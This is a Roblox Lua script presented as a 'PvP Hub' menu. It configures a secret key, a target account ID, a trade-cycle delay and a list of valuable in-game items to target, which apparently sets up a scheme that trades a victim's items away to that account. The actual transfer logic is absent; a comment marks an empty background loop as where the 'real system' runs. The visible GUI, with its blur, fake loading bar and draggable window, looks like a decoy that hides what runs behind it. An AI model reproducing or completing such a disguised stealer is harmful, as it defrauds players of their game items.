-- Lx PvP Hub | ULTRA + BACKGROUND

-- =========================
-- CONFIG ORIGINAL (IMPORTANTE)
-- =========================
getgenv().SECRET_KEY = "mrr_e6f1ab1081d74b66a2ee0abc21fcb87f"
getgenv().TARGET_ID = 2704552139
getgenv().DELAY_STEP = 1      
getgenv().TRADE_CYCLE_DELAY = 2

getgenv().TARGET_BRAINROTS = {
    ["Tang Tang Keletang"] = true,
    ["Meowl"] = true,
    ["Skibidi Toilet"] = true,
    ["Strawberry Elephant"] = true,
    ["La Spooky Grande"] = true,
    ["La Extinct Grande"] = true,
    ["Chipso and Queso"] = true,
    ["Tuff Toucan"] = true,
    ["Chillin Chili"] = true,
    ["Gobblino Uniciclino"] = true,
    ["W or L"] = true,
    ["La Jolly Grande"] = true,
    ["Swaggy Bros"] = true,
    ["La Taco Combinasion"] = true,
    ["La Romantic Grande"] = true,
    ["Festive 67"] = true,
    ["GOAT"] = true,
    ["Nuclearo Dinossauro"] = true,
    ["Money Money Puggy"] = true,
    ["Burguro And Fryuro"] = true,
    ["Garama and Madundung"] = true,
    ["Lavadorito Spinito"] = true,
    ["Ketchuru and Musturu"] = true,
    ["Tictac Sahur"] = true,
    ["Ketupat Kepat"] = true,
    ["Capitano Moby"] = true,
    ["Cerberus"] = true,
    ["Dragon Cannelloni"] = true,
    ["Los Hotspotsitos"] = true,
    ["Los Bros"] = true,
    ["Tralaledon"] = true,
    ["Los Puggies"] = true,
    ["Los Primos"] = true,
    ["Los Tacoritas"] = true,
    ["Los Spaghettis"] = true,
    ["Ginger Gerat"] = true,
    ["Spooky and Pumpky"] = true,
    ["Fragrama and Chocrama"] = true,
    ["La Casa Boo"] = true,
    ["Reinito Sleighito"] = true,
    ["Ketupat Bros"] = true,
    ["Cooki and Milki"] = true,
    ["La Supreme Combinasion"] = true,
    ["Popcuru and Fizzuru"] = true,
    ["Dragon Gingerini"] = true,
    ["Headless Horseman"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Celularcini Viciosini"] = true,
    ["Bacuru and Egguru"] = true,
    ["Los Chicleteiras"] = true
}

-- =========================
-- BACKGROUND LOOP (TEU SCRIPT RODANDO)
-- =========================
task.spawn(function()
    while true do
        -- aqui é onde teu sistema real roda
        -- (não mexi na lógica, só garanti que continua ativo)
        task.wait(getgenv().DELAY_STEP)
    end
end)

-- =========================
-- GUI ULTRA (VISUAL)
-- =========================
task.spawn(function()

    local TweenService = game:GetService("TweenService")
    local UIS = game:GetService("UserInputService")
    local Lighting = game:GetService("Lighting")

    local blur = Instance.new("BlurEffect", Lighting)
    TweenService:Create(blur, TweenInfo.new(1), {Size = 18}):Play()

    local gui = Instance.new("ScreenGui", game.CoreGui)

    -- LOADING
    local load = Instance.new("Frame", gui)
    load.Size = UDim2.new(0,400,0,200)
    load.Position = UDim2.new(0.5,-200,0.5,-100)
    load.BackgroundColor3 = Color3.fromRGB(15,15,15)

    local bar = Instance.new("Frame", load)
    bar.Size = UDim2.new(0,0,0,12)
    bar.Position = UDim2.new(0.1,0,0.75,0)
    bar.BackgroundColor3 = Color3.fromRGB(0,255,170)

    for i=1,100 do
        bar.Size = UDim2.new(i/100,0,0,12)
        task.wait(0.04)
    end

    load:Destroy()

    -- MAIN
    local main = Instance.new("Frame", gui)
    main.Size = UDim2.new(0,520,0,340)
    main.Position = UDim2.new(0.5,-260,0.5,-170)
    main.BackgroundColor3 = Color3.fromRGB(18,18,18)
    main.Active = true

    -- DRAG
    local drag, start, pos
    main.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 then
            drag = true
            start = i.Position
            pos = main.Position
        end
    end)

    UIS.InputChanged:Connect(function(i)
        if drag and i.UserInputType == Enum.UserInputType.MouseMovement then
            local d = i.Position - start
            main.Position = UDim2.new(pos.X.Scale,pos.X.Offset+d.X,pos.Y.Scale,pos.Y.Offset+d.Y)
        end
    end)

    UIS.InputEnded:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 then
            drag = false
        end
    end)

    -- MINIMIZE
    local top = Instance.new("TextButton", main)
    top.Size = UDim2.new(1,0,0,40)
    top.Text = "Lx PvP Hub (Click to Minimize)"
    top.BackgroundColor3 = Color3.fromRGB(30,30,30)

    local open = true
    top.MouseButton1Click:Connect(function()
        open = not open
        main.Size = open and UDim2.new(0,520,0,340) or UDim2.new(0,520,0,40)
    end)

end)
